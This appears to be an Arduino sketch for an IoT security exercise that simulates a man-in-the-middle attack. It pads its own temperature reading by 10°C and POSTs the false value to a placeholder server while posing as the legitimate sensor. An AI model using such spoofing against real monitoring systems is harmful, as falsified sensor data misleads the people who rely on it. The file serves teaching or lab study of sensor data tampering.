// Arduino sketch: Man-in-the-Middle Attack Simulator
// This sketch simulates a MitM attack by intercepting and modifying sensor data before it reaches the server. 
// For simulation, the attacker reads from its own ENV shield (as if it 'sniffed' the real sensor reading) 
// and then sends a falsified value to the server.
// Hardware: Arduino MKR WiFi 1010 + MKR ENV Shield (for intercepting environment data).

#include <WiFiNINA.h>
#include <Arduino_MKRENV.h>

const char* WIFI_SSID     = "YOUR_WIFI_SSID";       // TODO: replace with your WiFi network name
const char* WIFI_PASSWORD = "YOUR_WIFI_PASSWORD";   // TODO: replace with your WiFi password
const char* SERVER_HOST   = "192.168.1.100";        // TODO: target server IP or hostname (e.g., Flask server)
const int   SERVER_PORT   = 5000;                   // Target server port (e.g., 5000 for Flask)

WiFiClient client;

void setup() {
  Serial.begin(9600);
  // Initialize ENV shield if available (not strictly necessary for attack, but we use it to get a baseline reading)
  ENV.begin();
  // Connect to WiFi
  Serial.print("Connecting to WiFi...");
  WiFi.begin(WIFI_SSID, WIFI_PASSWORD);
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
  Serial.println("\nWiFi connected. Starting MitM attack simulation...");
}

void loop() {
  // (Intercept phase) Attacker obtains a sensor reading (simulating sniffing the real data in transit).
  float actualTemp = ENV.readTemperature();  // actual environment temperature (proxy for real data)
  
  // (Tamper phase) Modify the data maliciously
  float tamperedTemp = actualTemp + 10.0;    // example: add 10°C to the real reading (or any malicious alteration)
  Serial.print("Intercepted real temperature: ");
  Serial.print(actualTemp);
  Serial.print(" °C, sending tampered temperature: ");
  Serial.print(tamperedTemp);
  Serial.println(" °C");
  
  // (Forward phase) Send the tampered data to the server, impersonating the legitimate device
  if (client.connect(SERVER_HOST, SERVER_PORT)) {
    // Create JSON payload with falsified data
    String jsonPayload = String("{\"temperature\": ") + tamperedTemp + String("}");
    // Send HTTP POST request with the modified data
    client.println("POST /sensor-data HTTP/1.1");
    client.print("Host: "); client.println(SERVER_HOST);
    client.println("Content-Type: application/json");
    client.print("Content-Length: "); client.println(jsonPayload.length());
    client.println();
    client.println(jsonPayload);
    client.stop();
  } else {
    Serial.println("Failed to connect to server for MitM data injection.");
    client.stop();
  }
  
  delay(5000); // Wait before next intercept/replay cycle
}
